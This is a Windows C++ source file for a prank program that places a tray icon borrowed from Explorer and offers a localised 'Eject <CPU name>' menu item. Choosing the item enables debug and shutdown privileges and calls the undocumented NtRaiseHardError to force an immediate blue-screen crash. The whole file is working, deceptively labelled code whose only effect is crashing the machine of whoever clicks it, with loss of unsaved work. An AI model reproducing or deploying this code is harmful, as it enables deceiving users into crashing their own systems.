#include <Windows.h>
#include <intrin.h>
#include <string>

#pragma comment(lib, "Shlwapi.lib")

const char* GetCPUName() {
	int			CPUInfo[4]			 = {-1};
	static char CPUBrandString[0x40] = {0};
	if(CPUBrandString[0])
		return CPUBrandString;
	__cpuid(CPUInfo, 0x80000000);
	unsigned int nExIds = CPUInfo[0];
	memset(CPUBrandString, 0, sizeof(CPUBrandString));
	for(unsigned int i = 0x80000000; i <= nExIds; ++i) {
		__cpuid(CPUInfo, i);
		if(i == 0x80000002) {
			memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
		}
		else if(i == 0x80000003) {
			memcpy(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
		}
		else if(i == 0x80000004) {
			memcpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
		}
	}
	return CPUBrandString;
}
// 获取“弹出”的对应i18n字符串，如“弹出”、“Eject”、“Auswerfen”等
std::string GetEjectString() {
	//当地id
	LCID lcid = GetUserDefaultLCID();
	switch(lcid) {
	case 0x0404:	   // 繁体中文
	{
		return std::string{} + "彈出" + GetCPUName();
	}
	case 0x0804:	   // 简体中文
	{
		return std::string{} + "弹出" + GetCPUName();
	}
	case 0x0411:	   // 日语
	{
		return std::string{} + GetCPUName() + "を取り出す";
	}
	case 0x0412:	   // 韩语
	{
		return std::string{} + GetCPUName() + "를 추출";
	}
	case 0x0419:	   // 俄语
	{
		return std::string{} + "Извлечь " + GetCPUName();
	}
	case 0x041D:	   // 瑞典语
	{
		return std::string{} + "Ta ut " + GetCPUName();
	}
	case 0x041F:	   // 土耳其语
	{
		return std::string{} + GetCPUName() + " çıkar";
	}
	default:	   // 英语
	{
		return std::string{} + "Eject " + GetCPUName();
	}
	}
}

typedef enum _HARDERROR_RESPONSE_OPTION {
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION,
	*PHARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE {
	ResponseReturnToCaller,
	ResponseNotHandled,
	ResponseAbort,
	ResponseCancel,
	ResponseIgnore,
	ResponseNo,
	ResponseOk,
	ResponseRetry,
	ResponseYes
} HARDERROR_RESPONSE,
	*PHARDERROR_RESPONSE;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, OUT PHARDERROR_RESPONSE Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);


pdef_NtRaiseHardError	NtRaiseHardError;
pdef_RtlAdjustPrivilege RtlAdjustPrivilege;


const ULONG SE_DEBUG_PRIVILEGE	  = 20;
const ULONG SE_SHUTDOWN_PRIVILEGE = 19;


void bsod(ULONG ErrorCode) {
	BOOLEAN B;
	auto	pnt		   = GetModuleHandleA("ntdll.dll");
	RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(pnt, "RtlAdjustPrivilege");
	NtRaiseHardError   = (pdef_NtRaiseHardError)GetProcAddress(pnt, "NtRaiseHardError");
	RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &B);
	RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &B);
	HARDERROR_RESPONSE OR;
	OR = ResponseYes;
	NtRaiseHardError(ErrorCode, 0, 0, 0, OptionShutdownSystem, &OR);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// 互斥体
	HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\MyMutex");
	if(GetLastError() == ERROR_ALREADY_EXISTS) {
		return 0;
	}
	// 创建窗口类
	WNDCLASSW wc	 = {};
	wc.lpfnWndProc	 = WindowProc;
	wc.hInstance	 = hInstance;
	wc.lpszClassName = L"MyWindowClass";
	RegisterClassW(&wc);

	// 创建窗口
	HWND hwnd = CreateWindowExW(0, L"MyWindowClass", L"My Window", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);

	// 创建托盘图标
	NOTIFYICONDATA nid	 = {};
	nid.cbSize			 = sizeof(NOTIFYICONDATA);
	nid.hWnd			 = hwnd;
	nid.uID				 = 1;
	nid.uFlags			 = NIF_ICON | NIF_MESSAGE | NIF_TIP;
	nid.uCallbackMessage = WM_USER + 1;
	// 加载explorer.exe的默认图标
	nid.hIcon = LoadIconW(LoadLibraryW(L"explorer.exe"), MAKEINTRESOURCEW(263));
	memcpy(nid.szTip, L"My Application", sizeof(L"My Application"));
	Shell_NotifyIcon(NIM_ADD, &nid);

	// 消息循环
	MSG msg = {};
	while(GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// 移除托盘图标
	Shell_NotifyIcon(NIM_DELETE, &nid);

	return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch(uMsg) {
	case WM_USER + 1: {
		switch(lParam) {
		case WM_RBUTTONUP:
		case WM_LBUTTONDBLCLK: {
			// 弹出菜单
			HMENU hMenu = CreatePopupMenu();
			AppendMenuA(hMenu, MF_STRING, 1, GetEjectString().c_str());
			POINT pt;
			GetCursorPos(&pt);
			SetForegroundWindow(hwnd);
			TrackPopupMenu(hMenu, TPM_BOTTOMALIGN, pt.x, pt.y, 0, hwnd, NULL);
			DestroyMenu(hMenu);
			break;
		}
		}
		break;
	}
	case WM_DESTROY: {
		PostQuitMessage(0);
		break;
	}
	case WM_COMMAND: {
		switch(LOWORD(wParam)) {
		case 1: {
			bsod(0xDeadBeef);
			break;
		}
		}
		break;
	}
	default: {
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
	}
	return 0;
}
